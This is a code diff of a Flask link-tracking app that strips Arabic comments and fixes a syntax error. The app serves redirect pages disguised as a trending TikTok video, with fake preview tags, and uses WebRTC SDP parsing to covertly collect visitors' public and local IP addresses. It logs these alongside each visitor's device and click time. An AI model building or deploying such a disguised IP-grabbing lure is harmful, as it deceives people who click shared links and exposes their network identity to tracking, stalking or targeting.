@@ -186,7 +186,6 @@ def home():
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
         
-        # جلب الروابط مع عدد نقراتها
         cursor.execute('''
             SELECT l.id, l.original_url, l.note, COUNT(c.id) as clicks_count 
             FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
@@ -194,7 +193,6 @@ def home():
         ''')
         links_list = cursor.fetchall()
         
-        # جلب السجلات المفصلة للنقرات
         cursor.execute('''
             SELECT c.ip, c.local_ip, c.device, c.time, l.note 
             FROM clicks c JOIN links l ON c.link_id = l.id 
@@ -231,11 +229,8 @@ def secure_redirect(link_id):
         link_data = cursor.fetchone()
         
     if link_data:
-        # تحسين وسوم المعاينة المفتوحة (Open Graph) لتطبيقات التواصل
         title = "TikTok - فيديو رائج"
         description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر منصة تيك توك التفاعلية."
-        
-        # استخدام رابط صورة موثوق وثابت ومخصص للمعاينة التلقائية
         image_url = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600&auto=format&fit=crop"
         
         return f'''
@@ -283,7 +278,7 @@ def secure_redirect(link_id):
                         sdp.sdp.split('\\n').forEach(function(line) {{
                             if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                                 var parts = line.split(' ');
-                                parts.forEach(function(part){ Gram
+                                parts.forEach(function(part){{
                                     if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
                                         if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                                     }}
